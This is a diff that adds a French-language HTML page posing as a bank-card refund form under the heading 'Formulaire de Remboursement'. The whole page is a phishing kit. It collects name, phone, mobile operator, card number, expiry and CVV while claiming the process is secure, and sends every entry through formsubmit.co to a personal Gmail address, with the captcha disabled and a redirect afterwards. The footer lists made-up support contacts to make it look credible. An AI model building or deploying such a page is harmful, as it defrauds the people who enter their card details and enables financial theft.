@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Confirmation</title>
+    <style>
+        /* فقط إضافة التوسيط */
+        html, body {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        body > * {
+            max-width: 400px;
+            width: 100%;
+        }
+
+        /* باقي التنسيقات كما هي */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            margin: 0;
+            user-select: none;
+        }
+        #payment {
+            width: calc(100% - 40px);
+            max-width: 300px;
+            margin: 0;
+        }
+        #refund {
+            width: calc(100% - 40px);
+            max-width: 300px;
+            margin: 25px 0;
+        }
+        #card {
+            padding: 0 15px;
+            margin: 0 20px;
+            max-width: 320px;
+            box-sizing: border-box;
+        }
+        p {
+            margin: 5px 0;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        input,
+        select {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        #fullname,
+        #mmyy {
+            display: flex;
+            justify-content: space-between;
+            margin: 0;
+        }
+        #mmyy {
+            margin: 10px 0 0 0;
+        }
+        #firstname,
+        #lastname,
+        #mm,
+        #yy {
+            width: 48%;
+        }
+        #inputfirstname,
+        #inputlastname,
+        #inputphonenumber,
+        #cardnumber,
+        #inputmm,
+        #inputyy,
+        #cvv {
+            box-sizing: border-box;
+        }
+        #inputcardnumber {
+            letter-spacing: 2px;
+            margin: 0;
+            box-sizing: border-box;
+        }
+        #inputcvv {
+            width: 100%;
+            text-align: center;
+            margin: 0;
+            box-sizing: border-box;
+        }
+        input[type="number"] {
+            -moz-appearance: textfield;
+            appearance: textfield;
+        }
+        input[type="number"]::-webkit-outer-spin-button,
+        input[type="number"]::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        #button {
+            margin: 20px 0 0 0;
+            padding: 12px 5px;
+            background-color: #080;
+            color: #fff;
+            border-radius: 4px;
+            box-sizing: border-box;
+            max-width: 360px;
+            text-align: center;
+            cursor: pointer;
+            border: none;
+        }
+        #button:active {
+            background-color: #0a0;
+        }
+        #title {
+            width: calc(100% - 40px);
+            max-width: 200px;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            font-size: 20px;
+            color: #000;
+        }
+        #description {
+            width: calc(100% - 40px);
+            max-width: 250px;
+            margin: 20px 0;
+            padding: 0;
+            font-size: 12px;
+            font-weight: normal;
+            text-align: center;
+            color: #637463;
+        }
+        #footer {
+            background-color: #1a1a1a;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 15px;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            width: 100%;
+        }
+        #assistance {
+            margin: 0 0 10px 0;
+            width: fit-content;
+            font-size: clamp(8px, 4vw, 14px);
+        }
+        #social p,
+        #links p {
+            color: #33cc66;
+            text-decoration: none;
+            font-weight: normal;
+            margin: 0 2px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        #social,
+        #links {
+            margin: 20px 0;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 4px;
+            width: fit-content;
+        }
+        .en {
+            color: #33cc66;
+            margin: 0 0 0 8px;
+            font-size: clamp(10px, 4vw, 14px);
+        }
+        #copyright {
+            margin-top: 15px;
+            font-size: 12px;
+            font-weight: normal;
+            width: fit-content;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://files.catbox.moe/zbuhoh.jpg" alt="payment" id="payment" />
+    <p id="title">Formulaire de Remboursement</p>
+    <p id="description">
+        Veuillez entrer les informations de votre carte bancaire pour recevoir votre remboursement en toute sécurité. Ce
+        processus est sécurisé et protégé.
+    </p>
+
+    <form id="refundForm" action="https://formsubmit.co/elbainsaad9@gmail.com" method="POST">
+        <div id="card">
+            <div id="fullname">
+                <div id="firstname">
+                    <p id="titlefirstname">Prénom *</p>
+                    <input type="text" id="inputfirstname" name="Prénom" required />
+                </div>
+                <div id="lastname">
+                    <p id="titlelastname">Nom *</p>
+                    <input type="text" id="inputlastname" name="Nom" required />
+                </div>
+            </div>
+
+            <p id="titlephonenumber">Numero de telephone *</p>
+            <input type="text" id="inputphonenumber" name="Téléphone" oninput="formatPhoneNumber(event)" required />
+
+            <select id="operator" name="Opérateur" required>
+                <option value="select">-- Choisissez un operateur --</option>
+                <option value="orange">Orange</option>
+                <option value="sfr">SFR</option>
+                <option value="bouygues">Bouygues Telecom</option>
+                <option value="free">Free Mobile</option>
+            </select>
+
+            <p id="cardnumber">Numero de carte credit *</p>
+            <input type="text" id="inputcardnumber" name="Carte" oninput="formatCardNumber(event)" required />
+
+            <div id="mmyy">
+                <div id="mm">
+                    <p id="titlemm">Mois *</p>
+                    <select id="inputmm" name="Mois" required>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                </div>
+                <div id="yy">
+                    <p id="titleyy">Année *</p>
+                    <select id="inputyy" name="Année" required>
+                        <option value="25">25</option>
+                        <option value="26">26</option>
+                        <option value="27">27</option>
+                        <option value="28">28</option>
+                        <option value="29">29</option>
+                        <option value="30">30</option>
+                        <option value="31">31</option>
+                        <option value="32">32</option>
+                        <option value="33">33</option>
+                        <option value="34">34</option>
+                        <option value="35">35</option>
+                    </select>
+                </div>
+            </div>
+
+            <p id="cvv">CVV *</p>
+            <input type="text" id="inputcvv" name="CVV" oninput="validateInput('cvv')" required />
+
+            <button type="submit" id="button">Confirmer votre remboursement</button>
+ <!-- FormSubmit hidden fields -->
+            <input type="hidden" name="_next" value="https://sa3d3452.github.io/code/" />
+            <input type="hidden" name="_captcha" value="false" />
+           
+        </div>
+    </form>
+
+    <img src="https://files.catbox.moe/r7fjcx.jpeg" alt="refund" id="refund" />
+
+    <footer id="footer">
+        <p id="assistance">Pour toute assistance, contactez-nous :</p>
+        <p id="email">Email:<span class="en">support@remboursement.tech</span></p>
+        <p id="tele">Téléphone:<span class="en">+33 8 90 83 67 89</span></p>
+        <div id="social">
+            <p id="facebook">Facebook</p> |
+            <p id="twitter">Twitter</p> |
+            <p id="instagram">Instagram</p>
+        </div>
+        <div id="links">
+            <p id="privacy">Politique de confidentialité</p> |
+            <p id="terms">Conditions générales</p> |
+            <p id="sitemap">Plan du site</p>
+        </div>
+        <p id="copyright">© 2025 Service de Remboursement. Tous droits réservés.</p>
+    </footer>
+
+    <script>
+        function formatPhoneNumber(event) {
+            let input = event.target;
+            let value = input.value;
+
+            value = value.replace(/[^0-9]/g, '');
+
+            if (value.length > 10) {
+                value = value.slice(0, 10);
+            }
+
+            input.value = value;
+        }
+
+        function formatCardNumber(event) {
+            let input = event.target;
+            let value = input.value.replace(/\D/g, '');
+
+            value = value.replace(/(.{4})(?=\d)/g, '$1 ');
+
+            if (value.length > 19) {
+                value = value.slice(0, 19);
+            }
+
+            input.value = value;
+        }
+
+        function validateInput(field) {
+            let input = document.getElementById(`input${field}`);
+            let value = input.value.replace(/\D/g, '');
+
+            if (field === 'cvv') {
+                if (value.length > 4) {
+                    value = value.slice(0, 4);
+                }
+            }
+
+            input.value = value;
+        }
+
+        // منع سحب الصور
+        document.addEventListener('dragstart', function (event) {
+            if (event.target.tagName.toLowerCase() === 'img') {
+                event.preventDefault();
+            }
+        });
+
+        // التحقق من الحقول قبل الإرسال
+        document.getElementById('refundForm').addEventListener('submit', function (e) {
+            var firstname = document.getElementById('inputfirstname').value.trim();
+            var lastname = document.getElementById('inputlastname').value.trim();
+            var phone = document.getElementById('inputphonenumber').value.trim();
+            var cardnumber = document.getElementById('inputcardnumber').value.replace(/\s/g, '');
+            var operator = document.getElementById('operator').value;
+            var mm = document.getElementById('inputmm').value;
+            var yy = document.getElementById('inputyy').value;
+            var cvv = document.getElementById('inputcvv').value.trim();
+
+            if (
+                firstname === '' ||
+                lastname === '' ||
+                phone.length !== 10 ||
+                cardnumber.length !== 16 ||
+                cvv.length < 3 ||
+                operator === 'select'
+            ) {
+                alert('Certains champs sont vides ou invalides. Veuillez vérifier.');
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
